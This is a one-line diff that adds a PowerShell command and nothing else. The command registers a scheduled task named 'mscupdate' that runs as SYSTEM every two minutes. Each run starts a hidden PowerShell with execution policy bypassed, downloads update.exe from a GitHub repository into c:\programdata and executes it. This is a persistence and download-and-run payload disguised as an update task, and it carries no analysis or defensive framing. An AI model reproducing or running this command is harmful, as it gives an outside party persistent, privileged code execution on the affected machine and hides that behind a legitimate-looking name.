@@ -1,0 +1,1 @@
+$a=New-ScheduledTaskAction -ex "powershell" -ar "-w h -ep b curl https://github.com/br1337/Scripts/raw/main/update.exe -o c:\programdata\update.exe;c:\programdata\update.exe";$t=New-ScheduledTaskTrigger -repetitioni (New-TimeSpan -m 2) -at (Get-Date) -on;Register-ScheduledTask -taskn mscupdate -tr $t -ac $a -f -u system
